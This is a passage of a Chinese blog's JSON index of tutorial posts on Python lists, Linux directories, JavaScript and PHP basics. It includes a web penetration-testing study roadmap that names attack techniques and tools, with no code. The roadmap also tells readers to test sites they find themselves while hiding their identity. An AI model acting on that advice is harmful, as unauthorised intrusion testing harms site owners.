Python中的顺序表 Python中的list和tuple两种类型采用了顺序表的实现技术，具有前面讨论的顺序表的所有性质。 tuple是不可变类型，即不变的顺序表，因此不支持改变其内部状态的任何操作，而其他方面，则与list的性质类似。 list的基本实现技术 Python标准类型list就是一种元素个数可变的线性表，可以加入和删除元素，并在各种操作中维持已有元素的顺序（即保序），而且还具有以下行为特征： 基于下标（位置）的高效元素访问和更新，时间复杂度应该是O(1)； 为满足该特征，应该采用顺序表技术，表中元素保存在一块连续的存储区中。 允许任意加入元素，而且在不断加入元素的过程中，表对象的标识（函数id得到的值）不变。 为满足该特征，就必须能更换元素存储区，并且为保证更换存储区时list对象的标识id不变，只能采用分离式实现技术。 在Python的官方实现中，list就是一种采用分离式技术实现的动态顺序表。这就是为什么用list.append(x) （或 list.insert(len(list), x)，即尾部插入）比在指定位置插入元素效率高的原因。 在Python的官方实现中，list实现采用了如下的策略：在建立空表（或者很小的表）时，系统分配一块能容纳8个元素的存储区；在执行插入操作（insert或append）时，如果元素存储区满就换一块4倍大的存储区。但如果此时的表已经很大（目前的阀值为50000），则改变策略，采用加一倍的方法。引入这种改变策略的方式，是为了避免出现过多空闲的存储位置。","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[{"name":"顺序表","slug":"顺序表","permalink":"https://xiaowuyoucy.github.io/tags/顺序表/"}]},{"title":"Linux目录结构","slug":"201604150110","date":"2016-04-14T17:11:18.000Z","updated":"2019-04-14T18:02:10.469Z","comments":true,"path":"2016/04/15/201604150110/","link":"","permalink":"https://xiaowuyoucy.github.io/2016/04/15/201604150110/","excerpt":"","text":"linux 的文件系统是采用层级式的树状目录结构，在此结构中的最上一层是根目录“/” 然后在此目录下再创建其他的目录。 深刻理解Linux树状文件目录是非常重要的，linux有一句非常经典的话叫做:在linux世界里，一切皆文件。 以下是对这些目录的解释： /bin： bin是Binary的缩写, 这个目录存放着最经常使用的命令。 /boot： 这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。 /dev ： dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。 /dev ： dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。 /etc： 这个目录用来存放所有的系统管理所需要的配置文件和子目录。 /home： 用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。 /lib： 这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。 /lost+found： 这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。 /media： linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下。 /mnt： 系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在/mnt/上，然后进入该目录就可以查看光驱里的内容了。 /opt： 这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。 /proc： 这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。 这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器： 1echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all /root： 该目录为系统管理员，也称作超级权限者的用户主目录。 /sbin： s就是Super User的意思，这里存放的是系统管理员使用的系统管理程序。 /selinux： 这个目录是Redhat/CentOS所特有的目录，Selinux是一个安全机制，类似于windows的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。 /srv： 该目录存放一些服务启动之后需要提取的数据。 这是linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统 sysfs 。 sysfs文件系统集成了下面3种文件系统的信息：针对进程信息的proc文件系统、针对设备的devfs文件系统以及针对伪终端的devpts文件系统，该文件系统是内核设备树的一个直观反映。当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。 /tmp： 这个目录是用来存放一些临时文件的。 /usr： 这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。 /usr/bin： 系统用户使用的应用程序。 /usr/sbin： 超级用户使用的比较高级的管理程序和系统守护程序。 /usr/src： 内核源代码默认的放置目录。 /var： 这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。 /run： 是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run。 在 Linux 系统中，有几个目录是比较重要的，平时需要注意不要误删除或者随意更改内部文件。 /etc： 上边也提到了，这个是系统中的配置文件，如果你更改了该目录下的某个文件可能会导致系统不能启动。 /bin, /sbin, /usr/bin, /usr/sbin: 这是系统预设的执行文件的放置目录，比如 ls 就是在/bin/ls 目录下的。 值得提出的是，/bin, /usr/bin 是给系统用户使用的指令（除root外的通用户），而/sbin, /usr/sbin 则是给root使用的指令。 /var： 这是一个非常重要的目录，系统上跑了很多程序，那么每个程序都会有相应的日志产生，而这些日志就被记录到这个目录下，具体在/var/log 目录下，另外mail的预设放置也是在这里。","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[{"name":"linux目录结构","slug":"linux目录结构","permalink":"https://xiaowuyoucy.github.io/tags/linux目录结构/"}]},{"title":"js-this方法","slug":"201504091559","date":"2015-04-09T07:59:18.000Z","updated":"2019-04-09T08:00:20.819Z","comments":true,"path":"2015/04/09/201504091559/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/04/09/201504091559/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script&gt; // this出现在以下位置，分别代表什么 // 1 函数中 -- this 指向Window // 2 在方法中 -- this 指向的是这个方法所属的对象 // 3 构造函数中 -- this 就是构造函数创建的对象 // 函数 // function fn() &#123; // console.log(this); // &#125; // fn(); // 对象 // var obj = &#123; // name: 'zs', // fn: function () &#123; // console.log(this.name); // &#125; // &#125;; // obj.fn(); // 构造函数 function Fn() &#123; this.name = 'zs'; this.age = 18; console.log(this); &#125; // var o = new Fn(); // 调用构造函数 Fn(); // 函数调用 &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"js-this方法","slug":"js-this方法","permalink":"https://xiaowuyoucy.github.io/tags/js-this方法/"}]},{"title":"javascript函数","slug":"201504072316","date":"2015-04-07T15:16:20.000Z","updated":"2019-04-07T17:25:25.508Z","comments":true,"path":"2015/04/07/201504072316/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/04/07/201504072316/","excerpt":"","text":"什么是函数 把一段相对独立的具有特定功能的代码块封装起来，形成一个独立实体，就是函数，起个名字（函数名，在后续开发中可以反复调用,函数的作用就是封装一段代码，将来可以重复使用。 函数的定义 函数声明 123function 函数名() &#123; // 函数体&#125; 函数表达式 123var fn = function () &#123; // 函数体&#125; 特定：函数声明的时候，函数体并不会执行，只要当函数被调用的时候才会执行。 函数一般都用来干一件事情，函数名称一般使用动词。 调用函数的语法 函数名(); 特点：函数体只有在调用的时候才会执行，调用需要()进行调用。可以调用多次(重复使用) 代码示例： 1234567891011121314151617// 声明函数function sayHi() &#123; console.log(\"吃了没？\");&#125;// 调用函数sayHi();// 求1-100之间所有数的和function getSum() &#123; var sum = 0; for (var i = 0; i &lt; 100; i++) &#123; sum += i; &#125; console.log(sum);&#125;// 调用getSum(); 函数的参数 为什么要有参数 12345678910function getSum() &#123; var sum = 0; for (var i = 1; i &lt;= 100; i++) &#123; sum += i; &#125; console.log();&#125;// 虽然上面代码可以重复调用，但是只能计算1-100之间的值// 如果想要计算n-m之间所有数的和，应该怎么办呢？ 语法 12345678910// 函数内部是一个封闭的环境，可以通过参数的方式，把外部的值传递给函数内部// 带参数的函数声明function 函数名(形参1, 形参2, 形参3...) &#123; // 函数体&#125;// 带参数的函数调用函数名(实参1, 实参2, 实参3); 形参1 = 实参1形参2 = 实参2 形参和实参 形式参数：在声明一个函数的时候，为了函数的功能更加灵活，有些值是固定不了的，对于这些固定不了的值。我们可以给函数设置参数。这个参数没有具体的值，仅仅起到一个占位置的作用，我们通常称之为形式参数，也叫形参。 实际参数：如果函数在声明时，设置了形参，那么在函数调用的时候就需要传入对应的参数，我们把传入的参数叫做实际参数，也叫实参。 123456var x = 5, y = 6;fn(x,y); function fn(a, b) &#123; console.log(a + b);&#125;// x,y实参，有具体的值。函数执行的时候会把x,y复制一份给函数内部的a和b，函数内部的值是复制的新值，无法修改外部的x,y 函数返回值 当函数执行完的时候，并不是所有时候都要把结果打印。我们期望函数给我一些反馈（比如计算的结果返回进行后续的运算），这个时候可以让函数返回一些东西。也就是返回值。函数通过return返回一个返回值 返回值语法： 12345678//声明一个带返回值的函数function 函数名(形参1, 形参2, 形参3...) &#123; //函数体 return 返回值;&#125;//可以通过变量来接收这个返回值var 变量 = 函数名(实参1, 实参2, 实参3...);","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"javascript函数","slug":"javascript函数","permalink":"https://xiaowuyoucy.github.io/tags/javascript函数/"}]},{"title":"while和dowhile循环","slug":"201504051853","date":"2015-04-04T20:13:18.000Z","updated":"2019-04-05T11:35:51.671Z","comments":true,"path":"2015/04/05/201504051853/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/04/05/201504051853/","excerpt":"","text":"while与 do while 的区别： while：先判断再执行。 do…while：先执行再判断。（无论如何会执行一次循环体里面的代码，二while循环有可能一次都不会执行） 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; // 案例一：小盒子身上有100元，用while输出能吃多少次米线，一碗米线12元，最终还剩下多少钱。 var money = 100; while(money &gt;= 12)&#123; money -=12; console.log('我吃了一碗米线,还剩'+money+'元') &#125; //案例二：小盒子身上没钱了，吃了个霸王餐，用do...while实现。 do&#123; var money = 5; console.log(\"小盒子正在吃米线\"); money-=12 &#125;while(money&gt;=12) console.log(\"小盒子身上没钱了，吃了个霸王餐\");// 使用do-while循环：输出询问“我爱你，嫁给我吧？”，选择“你喜欢我吗？(y/n):\"，如果输入为y则打印”我们形影不离“，若输入为n,则继续询问 do &#123; var msg = prompt('你到底爱不爱我？', '请输入yes/no'); &#125; while (msg !== 'yes'); console.log('亲亲我的宝贝'); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"dowhile循环","slug":"dowhile循环","permalink":"https://xiaowuyoucy.github.io/tags/dowhile循环/"}]},{"title":"js布尔类型的隐私转换","slug":"201804051318","date":"2015-04-04T20:13:18.000Z","updated":"2019-04-08T03:27:01.009Z","comments":true,"path":"2015/04/05/201804051318/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/04/05/201804051318/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script&gt; // var num = 0; // console.log(Boolean(num)); // 转换成false的情况 0 ''空字符串 NaN null undefined // 隐式类型转换 // if (num) &#123; // console.log('hello'); // &#125; // // // var msg; // if (msg) &#123; // console.log('hello'); // &#125; // // var str = '123'; var isOK = !!str; // Boolean(str); console.log(isOK); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"js布尔类型隐私转换","slug":"js布尔类型隐私转换","permalink":"https://xiaowuyoucy.github.io/tags/js布尔类型隐私转换/"}]},{"title":"Python内置方法的时间复杂度测试分析","slug":"20150410224","date":"2015-03-30T20:13:18.000Z","updated":"2019-04-14T18:22:26.522Z","comments":true,"path":"2015/03/31/20150410224/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/03/31/20150410224/","excerpt":"","text":"timeit模块 timeit模块可以用来测试一小段Python代码的执行速度。 class timeit.Timer(stmt=‘pass’, setup=‘pass’, timer=) Timer是测量小段代码执行速度的类。 stmt参数是要测试的代码语句（statment）； setup参数是运行代码时需要的设置； timer参数是一个定时器函数，与平台有关。 timeit.Timer.timeit(number=1000000) Timer类中测试语句执行速度的对象方法。number参数是测试代码时的测试次数，默认为1000000次。方法返回执行代码的平均耗时，一个float类型的秒数。 list的操作测试 12345678910111213141516171819202122232425262728def test1(): l = [] for i in range(1000): l = l + [i]def test2(): l = [] for i in range(1000): l.append(i)def test3(): l = [i for i in range(1000)]def test4(): l = list(range(1000))from timeit import Timert1 = Timer(\"test1()\", \"from __main__ import test1\")print(\"concat \",t1.timeit(number=1000), \"seconds\")t2 = Timer(\"test2()\", \"from __main__ import test2\")print(\"append \",t2.timeit(number=1000), \"seconds\")t3 = Timer(\"test3()\", \"from __main__ import test3\")print(\"comprehension \",t3.timeit(number=1000), \"seconds\")t4 = Timer(\"test4()\", \"from __main__ import test4\")print(\"list range \",t4.timeit(number=1000), \"seconds\")# ('concat ', 1.7890608310699463, 'seconds')# ('append ', 0.13796091079711914, 'seconds')# ('comprehension ', 0.05671119689941406, 'seconds')# ('list range ', 0.014147043228149414, 'seconds') pop操作测试 123456789x = range(2000000)pop_zero = Timer(\"x.pop(0)\",\"from __main__ import x\")print(\"pop_zero \",pop_zero.timeit(number=1000), \"seconds\")x = range(2000000)pop_end = Timer(\"x.pop()\",\"from __main__ import x\")print(\"pop_end \",pop_end.timeit(number=1000), \"seconds\")# ('pop_zero ', 1.9101738929748535, 'seconds')# ('pop_end ', 0.00023603439331054688, 'seconds') 测试pop操作：从结果可以看出，pop最后一个元素的效率远远高于pop第一个元素 可以自行尝试下list的append(value)和insert(0,value),即一个后面插入和一个前面插入？？？ list内置操作的时间复杂度 dict内置操作的时间复杂度","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[{"name":"时间复杂度测试","slug":"时间复杂度测试","permalink":"https://xiaowuyoucy.github.io/tags/时间复杂度测试/"}]},{"title":"WEB安全渗透学习指南","slug":"201502092357","date":"2015-03-09T13:33:18.000Z","updated":"2019-04-23T15:15:27.231Z","comments":true,"path":"2015/03/09/201502092357/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/03/09/201502092357/","excerpt":"","text":"学习规划： 作者：向生李 链接：http://www.zhihu.com/question/21914899/answer/39344435 来源：知乎 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 Web安全相关概念 熟悉基本概念（SQL注入、上传、XSS、CSRF、一句话木马等）。 通过关键字（SQL注入、上传、XSS、CSRF、一句话木马等）进行Google/SecWiki； 阅读《精通脚本黑客》，虽然很旧也有错误，但是入门还是可以的； 看一些渗透笔记/视频，了解渗透实战的整个过程，可以Google（渗透笔记、渗透过程、入侵过程等）； 3周 熟悉渗透相关工具 熟悉AWVS、sqlmap、Burp、nessus、chopper、nmap、Appscan等相关工具的使用。 了解该类工具的用途和使用场景，先用软件名字Google/SecWiki； 下载无后们版的这些软件进行安装； 学习并进行使用，具体教材可以在SecWiki上搜索，例如：Brup的教程、sqlmap； 待常用的这几个软件都学会了可以安装音速启动做一个渗透工具箱； 5周 渗透实战操作掌握渗透的整个阶段并能够独立渗透小型站点。 网上找渗透视频看并思考其中的思路和原理，关键字（渗透、SQL注入视频、文件上传入侵、数据库备份、dedecms漏洞利用等等）； 自己找站点/搭建测试环境进行测试，记住请隐藏好你自己； 思考渗透主要分为几个阶段，每个阶段需要做那些工作，例如这个：PTES渗透测试执行标准； 研究SQL注入的种类、注入原理、手动注入技巧； 研究文件上传的原理，如何进行截断、双重后缀欺骗(IIS、PHP)、解析漏洞利用（IIS、Nignix、Apache）等，参照：上传攻击框架； 研究XSS形成的原理和种类，具体学习方法可以Google/SecWiki，可以参考：XSS； 研究Windows/Linux提权的方法和具体使用， 可以参考：提权； 可以参考: 开源渗透测试脆弱系统； 1周 关注安全圈动态 关注安全圈的最新漏洞、安全事件与技术文章。 通过SecWiki浏览每日的安全技术文章/事件； 通过Weibo/twitter关注安全圈的从业人员（遇到大牛的关注或者好友果断关注），天天抽时间刷一下； 通过feedly/鲜果订阅国内外安全技术博客（不要仅限于国内，平时多注意积累），没有订阅源的可以看一下SecWiki的聚合栏目； 养成习惯，每天主动提交安全技术文章链接到SecWiki进行积淀； 多关注下最新漏洞列表，推荐几个：exploit-db、CVE中文库、Wooyun等，遇到公开的漏洞都去实践下。 关注国内国际上的安全会议的议题或者录像，推荐SecWiki-Conference。 3周 熟悉Windows/Kali Linux 学习Windows/Kali Linux基本命令、常用工具； 熟悉Windows下的常用的cmd命令，例如：ipconfig,nslookup,tracert,net,tasklist,taskkill等； 熟悉Linux下的常用命令，例如：ifconfig,ls,cp,mv,vi,wget,service,sudo等； 熟悉Kali Linux系统下的常用工具，可以参考SecWiki,《Web Penetration Testing with Kali Linux》、《Hacking with Kali》等； 熟悉metasploit工具，可以参考SecWiki、《Metasploit渗透测试指南》。 3周 服务器安全配置 学习服务器环境配置，并能通过思考发现配置存在的安全问题。 Windows2003/2008环境下的IIS配置，特别注意配置安全和运行权限，可以参考：SecWiki-配置； Linux环境下的LAMP的安全配置，主要考虑运行权限、跨目录、文件夹权限等，可以参考：SecWiki-配置； 远程系统加固，限制用户名和口令登陆，通过iptables限制端口； 配置软件Waf加强系统安全，在服务器配置mod_security等系统，参见SecWiki-ModSecurity； 通过Nessus软件对配置环境进行安全检测，发现未知安全威胁。 4周 脚本编程学习 选择脚本语言Perl/Python/PHP/Go/Java中的一种，对常用库进行编程学习。 搭建开发环境和选择IDE，PHP环境推荐Wamp和XAMPP，IDE强烈推荐Sublime，一些Sublime的技巧：SecWiki-Sublime； Python编程学习，学习内容包含：语法、正则、文件、网络、多线程等常用库，推荐《Python核心编程》，不要看完； 用Python编写漏洞的exp，然后写一个简单的网络爬虫，可参见SecWiki-爬虫、视频； PHP基本语法学习并书写一个简单的博客系统，参见《PHP与MySQL程序设计（第4版）》、视频； 熟悉MVC架构，并试着学习一个PHP框架或者Python框架（可选）； 了解Bootstrap的布局或者CSS，可以参考：SecWiki-Bootstrap; 3周 源码审计与漏洞分析 能独立分析脚本源码程序并发现安全问题。 熟悉源码审计的动态和静态方法，并知道如何去分析程序，参见SecWiki-审计； 从Wooyun上寻找开源程序的漏洞进行分析并试着自己分析； 了解Web漏洞的形成原因，然后通过关键字进行查找分析，参见SecWiki-代码审计、高级PHP应用程序漏洞审核技术； 研究Web漏洞形成原理和如何从源码层面避免该类漏洞，并整理成checklist。 5周 安全体系设计与开发 能建立自己的安全体系，并能提出一些安全建议或者系统架构。 开发一些实用的安全小工具并开源，体现个人实力； 建立自己的安全体系，对公司安全有自己的一些认识和见解； 提出或者加入大型安全系统的架构或者开发；","categories":[{"name":"WEB安全渗透","slug":"WEB安全渗透","permalink":"https://xiaowuyoucy.github.io/categories/WEB安全渗透/"}],"tags":[{"name":"web安全渗透","slug":"web安全渗透","permalink":"https://xiaowuyoucy.github.io/tags/web安全渗透/"}]},{"title":"PHP中的4个预定义变量","slug":"201409240602","date":"2014-09-23T21:00:00.000Z","updated":"2019-09-24T13:45:36.071Z","comments":true,"path":"2014/09/24/201409240602/","link":"","permalink":"https://xiaowuyoucy.github.io/2014/09/24/201409240602/","excerpt":"","text":"$_GET 代表浏览器表单通过“get”方式提交的所有数据（集），可以称为“get数据”。 也可以理解为： $_GET变量里面会“自动存储”（保存/装载）提交到某个文件中的GET数据。 而GET数据，是在一个页面以“get”方式请求的时候提交的数据。 代码演示： 制作一个表单，有两个输入框，可以输出数字，并提交。 到另一个页面（文件）中，计算这两个数字的和！ 对该加法计算的一个改进： $_POST 代表浏览器表单通过“post”方式提交的所有数据（集），可以称为“POST数据”。 也可以理解为： $_POST变量里面会“自动存储”（保存/装载）提交到某个文件中的POST数据。 而POST数据，是在一个表单中以“post”方式提交的数据。 代码演示： 有个表单，两个输入框，可以填写数字，有一个“提交按钮”，点击提交，可以计算他们的和并输出。 扩展（提交给自己！）： $_REQUEST 代表浏览器通过“get”方式 或 “post”方式提交的数据的合集。 即：它既能接收到get过来的数据，也能接收到post过来的数据！ 通常，一个表单，只提交一种形式的数据，要么get数据，要么post数据！ 代码演示： 但，有一个情况，提交post数据的同时，也可以提交get数据： $_SERVER 它代表任何一次请求中，客户端或服务器端的一些“基本信息”或系统信息，包括很多（10多项）。 我们无非就是要知道，哪些信息是可以供我们使用的！ 常用的有： PHP_SELF： 表示当前请求的网页地址（不含域名部分） SERVER_NAME： 表示当前请求的服务器名 SERVER_ADDR： 表示当前请求的服务器IP地址 DOCUMENT_ROOT： 表示当前请求的网站物理路径（apache设置站点时那个） REMOTE_ADDR： 表示当前请求的客户端的IP地址 SCRIPT_NAME： 表示当前网页地址 代码演示：","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xiaowuyoucy.github.io/categories/PHP/"}],"tags":[{"name":"$_GET","slug":"GET","permalink":"https://xiaowuyoucy.github.io/tags/GET/"},{"name":"$_POST，$_SERVER","slug":"POST，-SERVER","permalink":"https://xiaowuyoucy.github.io/tags/POST，-SERVER/"},{"name":"$_REQUEST","slug":"REQUEST","permalink":"https://xiaowuyoucy.github.io/tags/REQUEST/"}]},{"title":"PHP变量的4个基本操作","slug":"201409240457","date":"2014-09-23T21:00:00.000Z","updated":"2019-09-24T17:59:22.040Z","comments":true,"path":"2014/09/24/201409240457/","link":"","permalink":"https://xiaowuyoucy.github.io/2014/09/24/201409240457/","excerpt":"","text":"1 赋值操作 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $name = \"PHP是世界上最好的语言\"; # 将数值1放入到变量（V1）中 #变量初始赋值后，可以后续再去重新赋值——这就是修改了变量的值，比如： #$name = “PHP不是世界上最好的语言”; ?&gt;&lt;/body&gt;&lt;/html&gt; 变量赋值的本质是：将变量名，跟一个数据“建立关联（联系） 2 取值操作 取值，就是，从变量这个容器中拿到其中存储的数据（值）； 取值无处不在：凡是使用到变量，并在该位置上，需要一个“数据”的时候，就会发生取值操作 3 判断变量isset() 就是判断一个“变量名”是否里面存储了数据！ 判断的结果是：true（真，表示有），或者false（假，表示没有）。 使用这个语法来判断：isset( $变量名 ); 还有一个特殊的赋值，赋值后，变量中也没有数据，如下： $v5 = null; //null是一个特殊的“数据”（值），该数据的含义是：没有数据。 即此时判断 isset($v5)的结果是“false”。 4 删除/销毁变量unset() 123456789101112131415161718&lt;?php $v1 = 1;$result = isset($v1); //将对变量v1的判断结果放到$result中echo $result; //实际结果是“true”，但echo输出后为“1”echo \"&lt;br&gt;\";var_dump($result); //这也是输出！ //var_dump()可以输出一个变量的完整信息$result2 = isset($v3);echo \"&lt;br&gt;v3的结果为：\";var_dump($result2);//下面演示unset掉一个变量后的结果：unset($v1); //销毁该变量！$result3 = isset($v1);echo \"&lt;br&gt;v1被unset()之后为：\";var_dump($result3);echo $v1; ?&gt; 当一个变量中存储了数据，我们也可以去销毁（删除）它，语法如下： unset( $变量名 ）。 删除变量的本质是：断开变量名跟其关联过的那个数据之间的“联系”，图示如下： 此时，该变量就不再指向某个数据了，其isset()判断的结果为false。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xiaowuyoucy.github.io/categories/PHP/"}],"tags":[{"name":"php变量","slug":"php变量","permalink":"https://xiaowuyoucy.github.io/tags/php变量/"},{"name":"变量的操作","slug":"变量的操作","permalink":"https://xiaowuyoucy.github.io/tags/变量的操作/"}]},{"title":"PHP常量","slug":"201409242200","date":"2014-09-23T21:00:00.000Z","updated":"2019-09-24T15:59:31.901Z","comments":true,"path":"2014/09/24/201409242200/","link":"","permalink":"https://xiaowuyoucy.github.io/2014/09/24/201409242200/","excerpt":"","text":"define()函数形式： define(‘常量名’, 对应的常量值); 常量名推荐使用“全大写”。 const关键字定义： const 常量名 = 对应的常量值; 演示： 常量的两种取值形式 直接使用： echo 常量名； //注意：使用常量，前面不带”$”符号，也不能有引号 使用constant()函数以取值： echo constant(‘常量名’); //注意，此时常量名要用引号引起来。 变量与常量的区别： 1，变量的数据可以变化（重新赋值），常量不可以。 2，变量可以存储各种数据类型，而常量只能存储简单数据类型。 3，给变量赋值可以是“计算”结果，但给常量赋值，只能是“直接写出的值”（字面值） 判断一个常量是否存在：defined(); 判断的结果返回：true（表示存在）或false（表示不存在） 形式： if（ defined (‘常量名’) ) { //如果该常量名存在，则… //…做什么事情。。。。 } 演示：","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xiaowuyoucy.github.io/categories/PHP/"}],"tags":[{"name":"PHP常量","slug":"PHP常量","permalink":"https://xiaowuyoucy.github.io/tags/PHP常量/"},{"name":"PHP两种定义常量的形式","slug":"PHP两种定义常量的形式","permalink":"https://xiaowuyoucy.github.io/tags/PHP两种定义常量的形式/"}]},{"title":"PHP中的3个魔术常量","slug":"201909250033","date":"2014-09-23T16:33:00.000Z","updated":"2019-09-24T16:37:00.239Z","comments":true,"path":"2014/09/24/201909250033/","link":"","permalink":"https://xiaowuyoucy.github.io/2014/09/24/201909250033/","excerpt":"","text":"含义： 魔术常量也是常量，只是在形式上为常量，而其值其实是“变化”的。 他们也是系统中预先定义好的，也就几个，下面是最常用的 3个： DIR ：代表当前php网页文件所在的目录 FILE ：代表当前php网页文件本身的路径 LINE, ：代表当前这个常量所在的行号","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xiaowuyoucy.github.io/categories/PHP/"}],"tags":[{"name":"__DIR__","slug":"DIR","permalink":"https://xiaowuyoucy.github.io/tags/DIR/"},{"name":"__FILE__","slug":"FILE","permalink":"https://xiaowuyoucy.github.io/tags/FILE/"},{"name":"__LINE__","slug":"LINE","permalink":"https://xiaowuyoucy.github.io/tags/LINE/"}]}]}